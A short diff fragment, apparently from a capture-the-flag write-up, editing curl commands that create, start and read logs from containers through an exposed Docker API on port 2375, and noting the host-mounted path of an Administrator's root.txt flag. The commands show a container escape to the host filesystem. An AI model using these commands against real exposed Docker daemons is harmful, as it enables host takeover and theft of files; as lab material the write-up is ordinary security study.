@@ -232,7 +232,6 @@ curl -H "Content-Type: application/json" \
   [http://192.168.65.7](http://192.168.65.7):2375/containers/create
 cid_find=3ee63229edff5f1eb765b3b22882c0506e867175505ce513ff2dae0cd04ddec0
 curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/start
-sleep 2
 curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/logs?stdout=true&stderr=true" 2>/dev/null | strings
 
 Discovery: Actual path is /mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt
@@ -247,7 +246,6 @@ curl -H "Content-Type: application/json" \
 
 cid_root=<NEW_CONTAINER_ID>
 curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/start
-sleep 2
 curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/logs?stdout=true&stderr=true" 2>/dev/null | strings
 ```
 ---
